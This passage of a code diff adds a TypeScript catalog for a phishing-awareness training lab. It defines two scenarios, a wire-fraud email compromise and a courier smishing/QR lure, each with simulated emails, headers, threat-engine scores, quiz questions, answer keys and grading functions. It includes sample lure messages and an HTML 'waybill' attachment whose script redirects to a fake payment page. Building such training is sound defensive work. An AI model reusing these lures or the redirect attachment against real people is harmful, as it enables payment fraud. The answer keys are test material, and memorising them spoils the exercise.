+      campaignId: "PH-2026-0701-007",
+      score: 62,
+      status: "BEC — low URL score, high business risk",
+      techniques: ["Mailbox takeover", "Wire-change", "Urgency", "Do-not-call instruction"],
+      url: { original: "—", hop1: "—", final: "—" },
+      infra: {
+        ip: "45.77.88.12",
+        asn: "AS20473",
+        registrar: "—",
+        privacy: false,
+        domain: "northwind-lab.com (legitimate, session anomaly)",
+        created: "2018",
+        ageDays: 2900,
+        ssl: "Org cert",
+      },
+      similar: 1,
+      sandbox: "No landing page. Payment fraud via compromised or spoof-resistant channel.",
+    },
+    sms: {
+      from: "MARA",
+      body: "AP: board asked you to process CLOSE-1844 now. Confirm in mail.",
+      time: "16:05 UTC",
+    },
+    voice: {
+      ticket: "SOC-007-B",
+      note: "CFO was in a flight. She did not send the wire mail. Unusual IMAP IP 45.77.88.12.",
+    },
+    attachmentSource: "No file. This lab is conversation + payment fraud.",
+    lureBrand: "No web lure in this lab",
+    lureHost: "none",
+    lureTemplate: "none",
+    questions: [
+      {
+        id: "q1",
+        points: 15,
+        kind: "choice",
+        prompt: "Did SPF/DKIM/DMARC fail?",
+        hint: "Headers.",
+        choices: ["Yes, all failed", "No — they passed; still treat as BEC"],
+        accept: ["No — they passed; still treat as BEC"],
+      },
+      {
+        id: "q2",
+        points: 15,
+        kind: "text",
+        prompt: "Anomalous IMAP / session IP noted in headers?",
+        hint: "X-Note.",
+        accept: ["45.77.88.12"],
+      },
+      {
+        id: "q3",
+        points: 15,
+        kind: "choice",
+        prompt: "Best first control?",
+        hint: "Out of band.",
+        choices: [
+          "Pay because auth passed",
+          "Out-of-band verify with known CFO number, freeze the wire",
+          "Click any portal in the thread",
+        ],
+        accept: ["Out-of-band verify with known CFO number, freeze the wire"],
+      },
+      {
+        id: "q4",
+        points: 10,
+        kind: "text",
+        prompt: "Engine detection score?",
+        hint: "Lower because no lure URL.",
+        accept: ["62", "62/100"],
+      },
+    ],
+  },
+  {
+    id: "parcel",
+    name: "Parcel Drop",
+    code: "PH-2026-0915-303",
+    minutes: 20,
+    blurb: "Carrier SMS + QR on a fake label + HTML “label PDF”.",
+    emails: [
+      {
+        id: "p1",
+        folder: "IT",
+        kind: "qr",
+        fromName: "North Courier",
+        fromAddr: "track@north-courier.support",
+        to: "reception@northwind-lab.com",
+        subject: "Delivery exception — customs",
+        date: "Tue, 15 Sep 2026 11:20:00 +0000",
+        unread: true,
+        preview: "Scan the label QR or open the attached waybill to pay a 14.00 fee…",
+        html: `<p>Package held. Pay 14.00 or it returns.</p>
+<p><a data-href="lure">Open tracking</a></p>`,
+        headers: `Received: from unknown ([203.0.113.90])
+From: "North Courier" <track@north-courier.support>
+Authentication-Results: mx.northwind-lab.com; spf=fail; dkim=none; dmarc=fail`,
+        auth: { spf: "fail", dkim: "none", dmarc: "fail" },
+        attachments: [{ id: "a3", name: "Waybill-44091.pdf.html", size: "9 KB", type: "text/html" }],
+      },
+    ],
+    engine: {
+      campaignId: "PH-2026-0915-303",
+      score: 88,
+      status: "Active",
+      techniques: ["Smishing", "Quishing", "Small-fee urgency", "HTML label"],
+      url: {
+        original: "https://north-courier.support/track/44091",
+        hop1: "https://ncourier.live/t/44091",
+        final: "https://ncourier.live/pay",
+      },
+      infra: {
+        ip: "203.0.113.90",
+        asn: "AS13335",
+        registrar: "Namecheap",
+        privacy: true,
+        domain: "ncourier.live",
+        created: "14 Sep 2026",
+        ageDays: 1,
+        ssl: "Let's Encrypt",
+      },
+      similar: 12,
+      sandbox: "Card form + cloned carrier branding. No malware.",
+    },
+    sms: {
+      from: "N-COURIER",
+      body: "Exception: pay 14.00 http://ncourier.live/p/44091",
+      time: "11:21 UTC",
+    },
+    voice: {
+      ticket: "SOC-303-P",
+      note: "Reception almost paid. No real North Courier account on file.",
+    },
+    attachmentSource: `<html><body><script>location="https://ncourier.live/pay"</script></body></html>`,
+    lureBrand: "North Courier pay portal (training clone)",
+    lureHost: "ncourier.live/pay",
+    lureTemplate: "courier-pay",
+    questions: [
+      {
+        id: "q1",
+        points: 15,
+        kind: "text",
+        prompt: "Payment domain?",
+        hint: "Final hop.",
+        accept: ["ncourier.live", "https://ncourier.live", "https://ncourier.live/pay"],
+      },
+      {
+        id: "q2",
+        points: 10,
+        kind: "text",
+        prompt: "Sending IP?",
+        hint: "Headers.",
+        accept: ["203.0.113.90"],
+      },
+      {
+        id: "q3",
+        points: 10,
+        kind: "choice",
+        prompt: "Primary extra-email vector?",
+        hint: "SMS + QR.",
+        choices: ["USB drop", "Smishing / quishing", "Printer firmware", "Wi-Fi pineapple only"],
+        accept: ["Smishing / quishing"],
+      },
+      {
+        id: "q4",
+        points: 10,
+        kind: "text",
+        prompt: "Detection score?",
+        hint: "Engine.",
+        accept: ["88", "88/100"],
+      },
+    ],
+  },
+];
+
+export function getLab(id: string | null | undefined) {
+  return catalog.find((l) => l.id === id) ?? catalog[0];
+}
+
+export function normalize(s: string) {
+  return s.trim().toLowerCase().replace(/\/+$/, "").replace(/^https?:\/\//, "");
+}
+
+export function gradeQuestion(q: Question, value: string) {
+  const n = normalize(value);
+  return q.accept.some((a) => normalize(a) === n);
+}
+
+export function totalFor(qs: Question[]) {
+  return qs.reduce((s, q) => s + q.points, 0);
+}
